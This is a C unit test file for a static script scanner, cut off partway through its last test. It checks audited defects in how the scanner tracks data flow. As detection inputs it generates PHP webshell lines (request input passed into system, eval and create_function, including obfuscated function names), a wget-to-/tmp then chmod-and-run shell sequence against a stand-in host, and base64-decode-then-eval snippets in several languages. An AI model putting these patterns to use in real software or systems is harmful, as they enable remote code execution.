/*
 * genome / diag_text_defects - one test per defect of the script graph audit (G1..G18, 2026-10-21), each written to FAIL on the code that had the defect and to pass on the code that
 * fixed it. The oracle of a cost is a COUNTER (kgenome_diag_text_req.work: slots the lookups looked at, edges the summaries kept, evaluator steps), never the clock: a table whose
 * entries share a hash is quadratic in a count and a stopwatch on a small text does not see it. The oracle of a cut is the scan's STATUS: a limit that fires must say so, and "found
 * or reported" is asserted over a whole range of sizes, so that the test does not fix the limit's value - only that crossing it is never silent (CLAUDE.md rule 4).
 *
 *   G1   names that share an FNV-1a hash flood the tables (variables, functions, the shell reader's variables, paths): the colliding names are generated HERE, against the unseeded hash
 *   G2   a callee a program names by a value takes the row of the name it comes to: `$l("", $_POST[0])` is create_function's second argument, `$l($_POST[0], "x")` is not
 *   G3   a call of a function the text defines stands for what the function returns, not for the arguments it ignores
 *   G4   a name built from more than six `.=` pieces is still a name
 *   G5   an alias chain deeper than eight variables is followed, or said to be cut; `$a = $a . 'x'` is a cycle, not a cut
 *   G6   nested functions deeper than the scope stack keep their own variables
 *   G7   `global` and `Dim` lists of any length
 *   G8   the evaluator's step budget spent is said
 *   G10  a command that holds more than sixteen paths, a path of 1100 bytes
 *   G11  one function name defined F times and called C times: the edges are bounded by the text and the cut is said
 *   G12  a line that begins with a NUL byte is a new statement
 *   G13  CR is a line end where it is not followed by LF
 *   G14  code a script computes nested past the layer bound, and a value past the evaluator's size bound, are said
 *   G15  the 64-bit key slot spreads over 32 bits (the tables it indexes may be larger than 2^24)
 *   G18  brackets nested past the frame bound are said
 * G9 (an allocation that fails) is diag_text_oom.c; G16 is tests/unit/text_scan_hold.c; G17 is cosmetic and has no test.
 *
 * usage: diag_text_defects
 */

#include <stdlib.h>

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <kofcore.h>
#include <phenotype/diag_scan.h>

#include "diag_text_collide.h"
#include <celllysis/nucleo.h>

#include "diag_text_graph.h"

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

/* ---- a growing text -------------------------------------------------------------------------------------------------- */

struct sb {
	char  *p;
	size_t n, cap;
};

static void sb_put(struct sb *b, const char *s, size_t n)
{
	if (b->n + n + 1u > b->cap) {
		b->cap = (b->n + n + 1u) * 2u;
		b->p = realloc(b->p, b->cap);
	}
	memcpy(b->p + b->n, s, n);
	b->n += n;
	b->p[b->n] = 0;
}

static void sb_cat(struct sb *b, const char *s)
{
	sb_put(b, s, strlen(s));
}

static void sb_free(struct sb *b)
{
	free(b->p);
	memset(b, 0, sizeof *b);
}

/* ---- a scan with its cost ---------------------------------------------------------------------------------------------- */

struct res {
	struct kgenome_diag_scan   *s;
	struct kgenome_diag_text_work w;
	enum kgenome_status         st;
	uint32_t                    cut;
};

static void on_const_nop(void *u, uint64_t off, uint64_t len, const uint8_t *v, uint32_t n)
{
	(void)u; (void)off; (void)len; (void)v; (void)n;
}

/* the one string function the tests need: strrev (a name built by a call: the engine's hook is not linked into a lib test) */
static int apply_rev(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	uint32_t i;

	(void)u;
	if (c->op != KGENOME_TEXTUAL_DEC_REVERSE || len > cap)
		return 0;
	for (i = 0; i < len; i++)
		out[i] = in[len - 1u - i];
	*n = len;
	return 1;
}

static struct res run(uint32_t lang, const char *src, size_t n, int consts)
{
	struct res r = { 0 };
	struct kgenome_diag_text_req rq = { .base = (const uint8_t *)src, .size = n, .lang = lang, .work = &r.w, .apply = apply_rev };

	if (consts)
		rq.on_const = on_const_nop;
	r.s = kgenome_diag_scan_text(&rq);
	r.st = r.s ? kgenome_diag_scan_status(r.s) : KGENOME_NOMEM;
	r.cut = r.s ? kgenome_diag_scan_eval_cut(r.s) : 0u;
	return r;
}

static struct res run_s(uint32_t lang, const char *src)
{
	return run(lang, src, strlen(src), 0);
}

static void done(struct res *r)
{
	if (r->s)
		kgenome_diag_scan_free(r->s);
	r->s = NULL;
}

/* ---- G1: colliding names ---------------------------------------------------------------------------------------------- */


/* the work a text of `n` names may cost: a few probes each (a table half full costs about two; the rehashes after it about as many again), and a margin */
#define PROBES_PER_NAME 40u

static void g1_one(const char *what, uint32_t lang, const char *pre, const char *mid, const char *post, const char *prefix_state, const char *each2, size_t pre_state_len, int consts)
{
	size_t n, i;
	char **names;
	struct sb b = { 0 };
	struct res r;
	uint32_t init = fnv_run(KOF_HASH_INIT, prefix_state, pre_state_len);

	names = collide(init, 12u, &n);
	sb_cat(&b, pre);
	for (i = 0; i < n; i++) {
		sb_cat(&b, mid);
		sb_cat(&b, names[i]);
		sb_cat(&b, post);
	}
	if (each2) {
		for (i = 0; i < n; i++) {
			sb_cat(&b, each2);
			sb_cat(&b, names[i]);
			sb_cat(&b, "();\n");
		}
	}
	r = run(lang, b.p, b.n, consts);
	CK(r.s != NULL, "G1 %s: a scan", what);
	CK(r.w.probes <= (uint64_t)PROBES_PER_NAME * n, "G1 %s: %llu slots looked at for %zu names that share a hash (at most %llu: quadratic is %llu)", what,
	   (unsigned long long)r.w.probes, n, (unsigned long long)PROBES_PER_NAME * n, (unsigned long long)n * n / 2u);
	CK(r.st == KGENOME_OK, "G1 %s: status %d", what, (int)r.st);
	done(&r);
	sb_free(&b);
	names_free(names, n);
}

static void g1(void)
{
	/* php: the variables ($NAME = 1), the functions (function NAME(){} and its call: the name table and its lookup) */
	g1_one("php variables", KGENOME_TEXTUAL_LANG_PHP, "<?php\n", "$", "=1;\n", "", NULL, 0, 0);
	g1_one("php functions", KGENOME_TEXTUAL_LANG_PHP, "<?php\n", "function ", "($a){ return $a; }\n", "", "", 0, 0);
	/* sh: the shell reader's variables (NAME=1, read once the constants are asked for), the paths nodes hold (chmod 777 /tmp/NAME) */
	g1_one("sh variables", KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\n", "", "=1\n", "", NULL, 0, 1);
	g1_one("sh paths", KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\n", "chmod 777 /tmp/", "\n", "/tmp/", NULL, 5, 0);
}

/* ---- G2 --------------------------------------------------------------------------------------------------------------- */

static int req_to_create(const char *src)
{
	struct res r = run_s(KGENOME_TEXTUAL_LANG_PHP, src);
	int l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_CREATE, 0xff) : -1;

	done(&r);
	return l;
}

static void g2(void)
{
	/* create_function($args, $code) runs its SECOND argument: the request in the second is the code that is made, in the first it is only the parameter list */
	CK(req_to_create("<?php create_function('', $_POST[0]);") == 1, "G2: direct call, request in the code");
	CK(req_to_create("<?php create_function($_POST[0], 'return 1;');") == 0, "G2: direct call, request in the parameter list is no link");
	CK(req_to_create("<?php $l = 'create_function'; $l('', $_POST[0]);") == 1, "G2: by a variable, request in the code (the link was lost)");
	CK(req_to_create("<?php $l = 'create_function'; $l($_POST[0], 'return 1;');") == 0, "G2: by a variable, request in the parameter list is no link (it was one)");
	CK(req_to_create("<?php $l = 'create_' . 'function'; $l('', $_POST[0]);") == 1, "G2: a built name, request in the code");
	CK(req_to_create("<?php $l = str_replace('k', '', 'ckrekatek_fuknkkction'); $l($_POST[0], 'return 1;');") == 0, "G2: str_replace built name, request in the parameter list");
	CK(req_to_create("<?php $f = array('create_function'); $f[0]('', $_POST[0]);") == 1, "G2: by an array element, request in the code");
	CK(req_to_create("<?php $f = array('create_function'); $f[0]($_POST[0], 'return 1;');") == 0, "G2: by an array element, request in the parameter list is no link");
}

/* ---- G3 --------------------------------------------------------------------------------------------------------------- */

static int req_to_exec(const char *src)
{
	struct res r = run_s(KGENOME_TEXTUAL_LANG_PHP, src);
	int l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;

	done(&r);
	return l;
}

static void g3(void)
{
	static const char g[] = "function g($a, $b) { return $b; } ";

	/* the result of g is its second argument: the first is read and ignored */
	{
		char b[512];

		snprintf(b, sizeof b, "<?php %ssystem(g($_GET[0], 'x'));", g);
		CK(req_to_exec(b) == 0, "G3: the ignored argument passes through the call result into system()");
		snprintf(b, sizeof b, "<?php %ssystem(g('x', $_GET[0]));", g);
		CK(req_to_exec(b) == 1, "G3: the returned argument reaches system()");
		snprintf(b, sizeof b, "<?php %s$v = g($_GET[0], 'x'); system($v);", g);
		CK(req_to_exec(b) == 0, "G3: the ignored argument reaches a variable through the call result");
		snprintf(b, sizeof b, "<?php %s$v = g('x', $_GET[0]); system($v);", g);
		CK(req_to_exec(b) == 1, "G3: the returned argument reaches a variable through the call result");
		snprintf(b, sizeof b, "<?php %sfunction w($x) { return g($x, 'k'); } system(w($_GET[0]));", g);
		CK(req_to_exec(b) == 0, "G3: the ignored argument reaches a function's own return through the call it is returned from");
		snprintf(b, sizeof b, "<?php %sfunction w($x) { return g('k', $x); } system(w($_GET[0]));", g);
		CK(req_to_exec(b) == 1, "G3: the returned argument reaches the return of the function that returns the call");
		snprintf(b, sizeof b, "<?php %ssystem(g('x', g($_GET[0], 'y')));", g);
		CK(req_to_exec(b) == 0, "G3: the ignored argument of the inner call reaches the outer one's result");
		snprintf(b, sizeof b, "<?php %ssystem(g('x', g('y', $_GET[0])));", g);
		CK(req_to_exec(b) == 1, "G3: the returned argument of the inner call reaches the outer one's result");
	}
	/* a value made and assigned INSIDE a function written in the argument of a call is the variable's, not the call's: the call that takes arguments does not take what a nested body holds
	 * (define(id, deps, function () { var xhr = new XMLHttpRequest(); xhr.open(..) }) lost the link between the two, on one real js file) */
	CK(req_to_exec("<?php function d($a, $b, $c) { return $c; } d(1, 2, function () { $x = $_GET[0]; system($x); });") == 1, "G3: a variable assigned in a closure that is an argument of a bound parameter");
	CK(req_to_exec("<?php function d($a, $b, $c) { return $c; } d(1, 2, function () { return system($_GET[0]); });") == 1, "G3: a call inside a closure that is an argument of a bound parameter");
	/* a function that ignores its parameter and returns what another function returns (the second returns a literal) */
	CK(req_to_exec("<?php function h() { return 'ls'; } function k($x) { return h(); } system(k($_GET[0]));") == 0, "G3: a parameter that only a literal-returning call answers for");
	CK(req_to_exec("<?php function k($x) { return $x; } system(k($_GET[0]));") == 1, "G3: the parameter that is returned");
	/* an argument the function names no parameter for may be read some other way (func_get_args): it is carried, as it always was */
	CK(req_to_exec("<?php function h() { return func_get_args(); } system(h($_GET[0]));") == 1, "G3: an argument past the declared parameters stays carried");
	/* a call of an unknown function stands for its arguments */
	CK(req_to_exec("<?php system(strtolower($_GET[0]));") == 1, "G3: a call of a function the text does not define stands for its arguments");
}

/* ---- G4: a name built from many pieces -------------------------------------------------------------------------------------- */

/* the name `name` written as a variable assigned its first letter and then appended to one letter at a time, so that it has strlen(name) pieces */
static int name_nodes(const char *name, uint16_t cap, int *reported)
{
	struct sb b = { 0 };
	size_t i;
	struct res r;
	int found;

	sb_cat(&b, "<?php $f = '");
	sb_put(&b, name, 1);
	sb_cat(&b, "';\n");
	for (i = 1; name[i]; i++) {
		sb_cat(&b, "$f .= '");
		sb_put(&b, name + i, 1);
		sb_cat(&b, "';\n");
	}
	sb_cat(&b, "$f($_GET[0]);\n");
	r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
	found = r.s ? count(r.s, cap) : -1;
	if (reported)
		*reported = r.st != KGENOME_OK;
	done(&r);
	sb_free(&b);
	return found;
}

static void g4(void)
{
	/* passthru has eight letters: eight pieces; the old bound was six */
	static const char *const names[] = { "system", "passthru", "shell_exec", "base64_decode" };
	static const uint16_t caps[] = { KGENOME_NUCLEO_EXEC_IMAGE, KGENOME_NUCLEO_EXEC_IMAGE, KGENOME_NUCLEO_EXEC_IMAGE, KGENOME_NUCLEO_DECODE };
	size_t i;

	for (i = 0; i < sizeof names / sizeof names[0]; i++) {
		int rep = 0, n = name_nodes(names[i], caps[i], &rep);

		CK(n == 1 || rep, "G4: %s written in %zu pieces: %d nodes, status %s", names[i], strlen(names[i]), n, rep ? "cut" : "ok");
		CK(n == 1, "G4: %s written in %zu pieces is a node (no limit of the piece count is meant to hide it)", names[i], strlen(names[i]));
	}
	/* a name of many pieces: 'system' followed by 200 empty appends */
	{
		struct sb b = { 0 };
		struct res r;
		int k;

		sb_cat(&b, "<?php $f = 'system';\n");
		for (k = 0; k < 200; k++)
			sb_cat(&b, "$f .= '';\n");
		sb_cat(&b, "$f($_GET[0]);\n");
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		CK(r.s && count(r.s, KGENOME_NUCLEO_EXEC_IMAGE) == 1, "G4: 'system' with 200 empty appends is a node");
		done(&r);
		sb_free(&b);
	}
}

/* ---- G5: an alias chain ----------------------------------------------------------------------------------------------- */

static void g5(void)
{
	int len;

	for (len = 1; len <= 70; len++) {
		struct sb b = { 0 };
		struct res r;
		char t[96];
		int k, found;

		sb_cat(&b, "<?php $v0 = 'system';\n");
		for (k = 1; k < len; k++) {
			snprintf(t, sizeof t, "$v%d = $v%d;\n", k, k - 1);
			sb_cat(&b, t);
		}
		snprintf(t, sizeof t, "$v%d($_GET[0]);\n", len - 1);
		sb_cat(&b, t);
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		found = r.s ? count(r.s, KGENOME_NUCLEO_EXEC_IMAGE) : -1;
		CK(found == 1 || r.st != KGENOME_OK, "G5: an alias chain of %d variables: %d nodes and the status is ok (a cut is silent)", len, found);
		if (len <= 24)
			CK(found == 1, "G5: an alias chain of %d variables is followed", len);
		done(&r);
		sb_free(&b);
	}
	/* `$a = $a . 'x'` is a cycle, which has no constant value: that is not a bound that fired */
	{
		struct res r = run_s(KGENOME_TEXTUAL_LANG_PHP, "<?php $a = 'system'; $a = $a . 'x'; $a($_GET[0]);");

		CK(r.s && r.st == KGENOME_OK && r.cut == 0, "G5: a variable that is its own right side is no cut (status %d, cut %u)", (int)r.st, r.cut);
		done(&r);
		r = run_s(KGENOME_TEXTUAL_LANG_PHP, "<?php $a = $b . 'x'; $b = $a . 'y'; $a($_GET[0]);");
		CK(r.s && r.st == KGENOME_OK && r.cut == 0, "G5: two variables that are each other's right side are no cut (status %d, cut %u)", (int)r.st, r.cut);
		done(&r);
	}
}

/* ---- G6: nested functions --------------------------------------------------------------------------------------------- */

static void g6(void)
{
	static const int depth[] = { 2, 63, 64, 65, 66, 100, 200 };
	size_t d;

	for (d = 0; d < sizeof depth / sizeof depth[0]; d++) {
		struct sb b = { 0 };
		struct res r;
		char t[64];
		int k, l;

		/* f1 { f2 { ... fN { $x = request; function g() { system($x); } } } }: the $x of g is g's own, the request is in the scope of fN */
		sb_cat(&b, "<?php\n");
		for (k = 1; k <= depth[d]; k++) {
			snprintf(t, sizeof t, "function f%d(){\n", k);
			sb_cat(&b, t);
		}
		sb_cat(&b, "$x = $_GET[0];\nfunction g(){ system($x); }\n");
		for (k = 0; k < depth[d]; k++)
			sb_cat(&b, "}\n");
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;
		CK(l == 0, "G6: %d nested functions: the variable of the innermost function is the request's (a link that merged two scopes)", depth[d]);
		done(&r);
		sb_free(&b);
	}
}

/* ---- G7: global and Dim lists ----------------------------------------------------------------------------------------- */

static void g7(void)
{
	static const int n[] = { 1, 31, 32, 33, 40, 100, 1000 };
	size_t d;

	for (d = 0; d < sizeof n / sizeof n[0]; d++) {
		struct sb b = { 0 };
		struct res r;
		char t[128];
		int k, l;

		/* php: `global $a1, ..., $aN` makes every one the top level's: the last is the request, and the function sends it to system */
		snprintf(t, sizeof t, "<?php\n$a%d = $_GET[0];\nfunction f(){ global ", n[d]);
		sb_cat(&b, t);
		for (k = 1; k <= n[d]; k++) {
			snprintf(t, sizeof t, "%s$a%d", k > 1 ? ", " : "", k);
			sb_cat(&b, t);
		}
		snprintf(t, sizeof t, "; system($a%d); }\n", n[d]);
		sb_cat(&b, t);
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;
		CK(l == 1, "G7: `global` with %d names: the last is the top level's (the link was lost past 32)", n[d]);
		done(&r);
		sb_free(&b);

		/* vbscript: `Dim a1, ..., aN` makes every one the function's own: the last is not the top level's request */
		memset(&b, 0, sizeof b);
		snprintf(t, sizeof t, "a%d = Request(\"x\")\r\nFunction f()\r\nDim ", n[d]);
		sb_cat(&b, t);
		for (k = 1; k <= n[d]; k++) {
			snprintf(t, sizeof t, "%sa%d", k > 1 ? ", " : "", k);
			sb_cat(&b, t);
		}
		snprintf(t, sizeof t, "\r\nCreateObject(\"WScript.Shell\").Run a%d\r\nEnd Function\r\n", n[d]);
		sb_cat(&b, t);
		r = run(KGENOME_TEXTUAL_LANG_VBS, b.p, b.n, 0);
		l = r.s ? linked(r.s, KGENOME_NUCLEO_REQUEST, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;
		CK(l == 0, "G7: `Dim` with %d names: the last is the function's own (a link to the top level's, wrong, past 32)", n[d]);
		done(&r);
		sb_free(&b);
	}
}

/* the lists are read once: a text of nested functions that each hold a `global` list with no statement end, and of `Dim` lists on one line, costs the tokens of the lists */
static void g7_cost(void)
{
	struct sb b = { 0 };
	struct res r;
	char t[64];
	int k;

	sb_cat(&b, "<?php ");
	for (k = 0; k < 3000; k++) {
		snprintf(t, sizeof t, "function f%d(){ global $a, $b, $c ", k);
		sb_cat(&b, t);
	}
	r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
	CK(r.w.listed <= 3u * (uint64_t)b.n, "G7: nested functions, each with a global list that no statement ends: %llu tokens read for %zu bytes", (unsigned long long)r.w.listed, b.n);
	done(&r);
	sb_free(&b);
	memset(&b, 0, sizeof b);
	for (k = 0; k < 3000; k++)
		sb_cat(&b, "Function f()\r\n Dim a, b, c : Dim d, e : End Function ");
	r = run(KGENOME_TEXTUAL_LANG_VBS, b.p, b.n, 0);
	CK(r.w.listed <= 3u * (uint64_t)b.n, "G7: functions with Dim lists: %llu tokens read for %zu bytes", (unsigned long long)r.w.listed, b.n);
	done(&r);
	sb_free(&b);
}

/* ---- G8: the evaluator's step budget ---------------------------------------------------------------------------------- */

static void g8(void)
{
	static const int calls[] = { 10, 300, 1000, 3000, 8000 };
	size_t d;

	for (d = 0; d < sizeof calls / sizeof calls[0]; d++) {
		struct sb b = { 0 };
		struct res r;
		char t[96];
		int k, found;

		/* a variable that is read as a callee costs the evaluator all the leaves of the chain it is built from (2^7 of them here, and it is not the name of anything) */
		sb_cat(&b, "<?php\n$v0 = 'ab';\n");
		for (k = 1; k < 8; k++) {
			snprintf(t, sizeof t, "$v%d = $v%d . $v%d;\n", k, k - 1, k - 1);
			sb_cat(&b, t);
		}
		for (k = 0; k < calls[d]; k++)
			sb_cat(&b, "$v7($z);\n");
		sb_cat(&b, "$f = strrev('metsys'); $f($_GET[0]);\n");
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		found = r.s ? count(r.s, KGENOME_NUCLEO_EXEC_IMAGE) : -1;
		CK(found == 1 || r.st != KGENOME_OK || r.cut, "G8: %d earlier reads of a costly variable: the later name is %s and the scan says nothing (steps spent %llu)", calls[d],
		   found == 1 ? "found" : "lost", (unsigned long long)r.w.steps);
		done(&r);
		sb_free(&b);
	}
}

/* ---- G10: paths a command holds --------------------------------------------------------------------------------------- */

/* wget -O /tmp/fN URL; chmod +x /tmp/f1 .. /tmp/fN; sh /tmp/fN: the file the download made is the one run, through a chmod that names N files */
static int path_link(int n, int *reported)
{
	struct sb b = { 0 };
	struct res r;
	char t[64];
	int k, l;

	snprintf(t, sizeof t, "wget -O /tmp/f%d http://e.com/x\nchmod +x", n);
	sb_cat(&b, t);
	for (k = 1; k <= n; k++) {
		snprintf(t, sizeof t, " /tmp/f%d", k);
		sb_cat(&b, t);
	}
	snprintf(t, sizeof t, "\nsh /tmp/f%d\n", n);
	sb_cat(&b, t);
	r = run(KGENOME_TEXTUAL_LANG_SH, b.p, b.n, 0);
	l = r.s ? linked(r.s, KGENOME_NUCLEO_PERM_SET, KGENOME_NUCLEO_EXEC_IMAGE, 0xff) : -1;
	if (reported)
		*reported = r.st != KGENOME_OK;
	done(&r);
	sb_free(&b);
	return l;
}

static void g10(void)
{
	static const int n[] = { 10, 16, 17, 30, 60, 64, 65, 100 };
	size_t d;

	for (d = 0; d < sizeof n / sizeof n[0]; d++) {
		int rep = 0, l = path_link(n[d], &rep);

		CK(l == 1 || rep, "G10: chmod of %d files, the last the one that was downloaded and run: %s, status %s", n[d], l == 1 ? "linked" : "no link", rep ? "cut" : "ok");
		if (n[d] <= 60)
			CK(l == 1, "G10: chmod of %d files: the file the download made is the one run", n[d]);
	}
	/* a path of 1100 and of 4000 bytes: PATH_MAX is 4096 */
	{
		static const int len[] = { 1100, 4000 };
		size_t i;

		for (i = 0; i < 2; i++) {
			struct sb b = { 0 };
			struct res r;
			char *name = malloc((size_t)len[i] + 1u);
			int l;

			memset(name, 'd', (size_t)len[i]);
			name[len[i]] = 0;
			sb_cat(&b, "wget -O /tmp/");
			sb_cat(&b, name);
			sb_cat(&b, " http://e.com/x\nchmod +x /tmp/");
			sb_cat(&b, name);
			sb_cat(&b, "\n");
			r = run(KGENOME_TEXTUAL_LANG_SH, b.p, b.n, 0);
			l = r.s ? linked(r.s, KGENOME_NUCLEO_HTTP_FETCH, KGENOME_NUCLEO_PERM_SET, 0xff) : -1;
			CK(l == 1, "G10: a path of %d bytes names one file (PATH_MAX is 4096)", len[i]);
			done(&r);
			sb_free(&b);
			free(name);
		}
	}
}

/* ---- G11: one name defined F times and called C times ----------------------------------------------------------------- */

static void g11(void)
{
	static const int fc[][2] = { { 1, 1 }, { 3, 3 }, { 20, 20 }, { 200, 200 }, { 600, 600 } };
	size_t d;

	for (d = 0; d < sizeof fc / sizeof fc[0]; d++) {
		struct sb b = { 0 };
		struct res r;
		char t[96];
		int k;
		uint64_t product = (uint64_t)fc[d][0] * (uint64_t)fc[d][1];

		sb_cat(&b, "<?php\n");
		for (k = 0; k < fc[d][0]; k++)
			sb_cat(&b, "function f($a){ system($a); return $a; }\n");
		for (k = 0; k < fc[d][1]; k++) {
			snprintf(t, sizeof t, "$v%d = f($_GET['x']); eval($v%d);\n", k, k);
			sb_cat(&b, t);
		}
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		/* the edges are bounded by the text (a few a token), and a text that needs more than that says so */
		CK(r.w.edges <= 4u * (uint64_t)b.n + 4096u, "G11: %d definitions and %d calls: %llu edges kept for %zu bytes of text (the product is %llu)", fc[d][0], fc[d][1],
		   (unsigned long long)r.w.edges, b.n, (unsigned long long)product);
		/* a text that needs more than the bound says so */
		CK(r.w.edges <= product / 2u + 64u || r.st != KGENOME_OK, "G11: %d definitions and %d calls: %llu edges kept (the product is %llu) and the status is ok", fc[d][0], fc[d][1],
		   (unsigned long long)r.w.edges, (unsigned long long)product);
		if (product <= 9u)
			CK(r.st == KGENOME_OK, "G11: %d definitions and %d calls: a small text is read whole (status %d)", fc[d][0], fc[d][1], (int)r.st);
		done(&r);
		sb_free(&b);
	}
}

/* ---- G12 / G13: line ends --------------------------------------------------------------------------------------------- */

/* The graph of a text as a string: the capabilities in order and the links by index: two texts that differ only in how their lines end have one. */
static void graph_sig(const struct kgenome_diag_scan *s, char *out, size_t cap)
{
	uint32_t i, k;
	size_t n = 0;

	out[0] = 0;
	for (i = 0; i < kgenome_diag_scan_count(s) && n + 64u < cap; i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		n += (size_t)snprintf(out + n, cap - n, "%u:%u[", i, (unsigned)h->cap);
		for (k = 0; k < h->n_in; k++)
			n += (size_t)snprintf(out + n, cap - n, "%u/%u/%u ", (unsigned)h->in[k].from, (unsigned)h->in[k].role, (unsigned)h->in[k].kind);
		n += (size_t)snprintf(out + n, cap - n, "]");
	}
}

struct dialect {
	const char *name;
	uint32_t    lang;
	const char *l1, *l2, *l3;       /* three statements: a decode that makes `d`, a command unrelated to it, and the eval/exec that reads `d` */
};

static const struct dialect lines_dial[] = {
	{ "python", KGENOME_TEXTUAL_LANG_PY, "d = base64.b64decode(s)", "os.system('ls')", "eval(d)" },
	{ "lua", KGENOME_TEXTUAL_LANG_LUA, "d = base64.dec(s)", "os.execute('ls')", "loadstring(d)" },
	{ "ruby", KGENOME_TEXTUAL_LANG_RUBY, "d = Base64.decode64(s)", "system('ls')", "eval(d)" },
	{ "vbs", KGENOME_TEXTUAL_LANG_VBS, "d = StrReverse(s)", "Set o = CreateObject(\"WScript.Shell\")", "Execute d" },
	{ "js", KGENOME_TEXTUAL_LANG_JS, "var d = atob(s)", "new ActiveXObject('WScript.Shell')", "eval(d)" },
};

/* the text with every line ended by `eol` */
static size_t lines_text(char *out, const struct dialect *d, const char *eol)
{
	return (size_t)sprintf(out, "%s%s%s%s%s%s", d->l1, eol, d->l2, eol, d->l3, eol);
}

static void g12_13(void)
{
	size_t i;

	for (i = 0; i < sizeof lines_dial / sizeof lines_dial[0]; i++) {
		const struct dialect *d = &lines_dial[i];
		char lf[512], cr[512], crlf[512], nul[512], g_lf[2048], g_other[2048];
		struct res a, b;
		size_t nlf = lines_text(lf, d, "\n"), ncr = lines_text(cr, d, "\r"), ncrlf = lines_text(crlf, d, "\r\n"), nnul;

		/* the second line begins with a NUL byte: written as "\n\0cmd" */
		nnul = (size_t)sprintf(nul, "%s\n", d->l1);
		nnul += (size_t)sprintf(nul + nnul, "%c%s\n", 0, d->l2);
		nnul += (size_t)sprintf(nul + nnul, "%s\n", d->l3);

		a = run(d->lang, lf, nlf, 0);
		CK(a.s != NULL, "%s: scan", d->name);
		graph_sig(a.s, g_lf, sizeof g_lf);
		/* LF is the reference; the other three must make the same graph */
		b = run(d->lang, cr, ncr, 0);
		graph_sig(b.s, g_other, sizeof g_other);
		CK(strcmp(g_lf, g_other) == 0, "G13 %s: CR-only line ends: [%s] against LF [%s]", d->name, g_other, g_lf);
		done(&b);
		b = run(d->lang, crlf, ncrlf, 0);
		graph_sig(b.s, g_other, sizeof g_other);
		CK(strcmp(g_lf, g_other) == 0, "G13 %s: CRLF line ends: [%s] against LF [%s]", d->name, g_other, g_lf);
		done(&b);
		/* ruby's own lexer ends the program at a NUL (as ruby does: it is the end of the file there), so nothing after it is a token: not this route's to say */
		if (d->lang != KGENOME_TEXTUAL_LANG_RUBY) {
			b = run(d->lang, nul, nnul, 0);
			graph_sig(b.s, g_other, sizeof g_other);
			CK(strcmp(g_lf, g_other) == 0, "G12 %s: a line that begins with a NUL: [%s] against LF [%s]", d->name, g_other, g_lf);
			done(&b);
		}
		done(&a);
	}
}

/* ---- G14: layers and values past their bounds ------------------------------------------------------------------------ */

/* eval('...') wrapped `depth` times around `system($_GET[0]);`: the text of each layer is a literal of the one outside, so it is escaped once more at each */
static char *layered(int depth, size_t *n)
{
	struct sb cur = { 0 };
	int k;

	sb_cat(&cur, "system($_GET[0]);");
	for (k = 0; k < depth; k++) {
		struct sb nx = { 0 };
		size_t i;

		sb_cat(&nx, "eval('");
		for (i = 0; i < cur.n; i++) {
			if (cur.p[i] == '\\' || cur.p[i] == '\'')
				sb_put(&nx, "\\", 1);
			sb_put(&nx, cur.p + i, 1);
		}
		sb_cat(&nx, "');");
		sb_free(&cur);
		cur = nx;
	}
	{
		struct sb top = { 0 };

		sb_cat(&top, "<?php ");
		sb_put(&top, cur.p, cur.n);
		sb_free(&cur);
		*n = top.n;
		return top.p;
	}
}

static void g14(void)
{
	int depth;

	for (depth = 1; depth <= 19; depth++) {
		size_t n;
		char *src = layered(depth, &n);
		struct res r = run(KGENOME_TEXTUAL_LANG_PHP, src, n, 0);
		int found = r.s ? count(r.s, KGENOME_NUCLEO_EXEC_IMAGE) : -1;

		CK(found == 1 || r.st != KGENOME_OK, "G14: code computed %d layers deep: %d system nodes and the status is ok (a layer past the bound is dropped silently)", depth, found);
		if (depth <= 15)
			CK(found == 1, "G14: code computed %d layers deep is followed", depth);
		done(&r);
		free(src);
	}
	/* a value of 1.2 MiB handed to eval: the evaluator does not hold it, and says so */
	{
		struct sb b = { 0 };
		struct res r;
		size_t i;

		sb_cat(&b, "<?php eval('");
		for (i = 0; i < (1200u << 10); i += 8u)
			sb_cat(&b, "/*pad*/ ");
		sb_cat(&b, "system($_GET[0]);');");
		r = run(KGENOME_TEXTUAL_LANG_PHP, b.p, b.n, 0);
		CK((r.s && count(r.s, KGENOME_NUCLEO_EXEC_IMAGE) == 1) || r.st != KGENOME_OK || r.cut, "G14: a 1.2 MiB code constant: its code is neither read nor said to be unread");
		done(&r);
		sb_free(&b);
	}
}

/* ---- G15 -------------------------------------------------------------------------------------------------------------- */

static void g15(void)
{
	uint32_t max = 0;
	uint64_t k;

	/* the slot of a 64-bit key indexes tables that may hold more than 2^24 slots: it has to reach them (a home confined to the first 2^24 clusters every entry of a larger one) */
	for (k = 1; k < (1u << 22); k++) {
		uint32_t s = kof_hash64_slot(k * 0x100000001b3ull);

		if (s > max)
			max = s;
	}
	CK(max >= (1u << 24), "G15: kof_hash64_slot reaches %u at most: a table of 2^25 slots is confined to its first 2^24", max);
}

/* ---- G18: brackets past the frame bound ------------------------------------------------------------------------------- */

static void g18(void)
{
	static const int depth[] = { 100, 4000, 4095, 4096, 4097, 5000, 20000 };
	size_t d;

	for (d = 0; d < sizeof depth / sizeof depth[0]; d++) {
		struct sb b = { 0 };
		struct res r;
		int k;

